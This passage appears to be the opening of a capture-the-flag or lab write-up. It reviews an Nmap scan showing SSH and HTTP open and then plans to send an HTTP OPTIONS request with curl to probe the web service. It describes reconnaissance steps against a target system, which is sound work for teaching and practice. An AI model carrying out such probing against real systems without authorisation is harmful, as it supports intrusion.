From the Nmap scan, we can see that 2 ports are open. Port 22 and 80, which are standard SSH, HTTP ports respectively. Port 22 ie, SSH port needs a username and password, we do not have that (assuming brute force is not an option). Port 80 is for web applications. We can find something interesting in port 80, HTTP methods. You can read more about OPTIONS method here

Since this is related to HTTP methods, we can use the curl command-line program to issue an OPTION request.
